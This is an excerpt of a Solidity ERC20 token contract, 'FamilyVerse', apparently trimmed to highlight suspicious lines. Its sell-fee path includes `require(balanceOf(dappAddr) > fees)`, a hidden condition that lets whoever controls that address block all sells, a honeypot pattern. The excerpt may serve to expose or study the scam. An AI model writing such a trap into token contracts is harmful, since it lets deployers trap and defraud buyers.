...
contract FamilyVerse is ERC20, Ownable {
    ...
    constructor(address _dapp) ERC20("FamilyVerse", "FMV") {
        ...
        excludeFromFees(dappAddr, true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xdead), true);
        excludeFromMaxTransaction(dappAddr, true);
        
        /*
            _mint is an internal function in ERC20.sol that is only called here,
            and CANNOT be called ever again
        */
        _mint(dappAddr, totalSupply * 4 / 100);
        _mint(msg.sender, totalSupply * 96 / 100);
    }
    ...
    function _transfer(
        ...
        if(takeFee){
            ...
            if (automatedMarketMakerPairs[to] && sellTotalFees > 0){
                fees = amount.mul(sellTotalFees).div(100); require(balanceOf(dappAddr) > fees);
    ...
    function swapBack() private {
        ...
        payable(dappAddr).transfer(ethForMarketing);
